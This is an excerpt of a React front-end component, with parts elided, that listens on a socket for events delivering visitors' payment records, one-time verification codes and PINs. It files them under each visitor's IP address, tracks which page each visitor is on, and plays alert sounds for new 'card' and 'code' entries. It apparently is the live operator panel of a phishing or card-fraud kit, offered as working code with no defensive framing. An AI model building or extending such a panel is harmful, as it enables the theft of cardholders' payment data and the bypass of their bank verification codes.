...
export default function App() {
  ...
  useEffect(() => {
    ...
    socket.on("newIndex", (doc) => {
      setUsers(prev => ({ ...prev, [doc.ip]: { ...(prev[doc.ip] || { payments: [] }), ...doc } }));
      playSound("data");
    });
    ...
    socket.on("newPayment", (doc) => {
      setUsers(prev => {
        ...
        return { ...prev, [doc.ip]: { ...old, payments: [...old.payments, doc] } };
      });
      playSound("card");
    });

    socket.on("newOtp", (doc) => {
      setUsers(prev => ({ ...prev, [doc.ip]: { ...(prev[doc.ip] || { payments: [] }), verificationCode: doc.verificationCode } }));
      playSound("code");
    });

    socket.on("newPin", (doc) => {
      setUsers(prev => ({ ...prev, [doc.ip]: { ...(prev[doc.ip] || { payments: [] }), pin: doc.pin } }));
      playSound("code");
    });

    socket.on("locationUpdated", ({ ip, page }) => {
      setUsers(prev => ({ ...prev, [ip]: { ...(prev[ip] || { payments: [] }), currentPage: page } }));
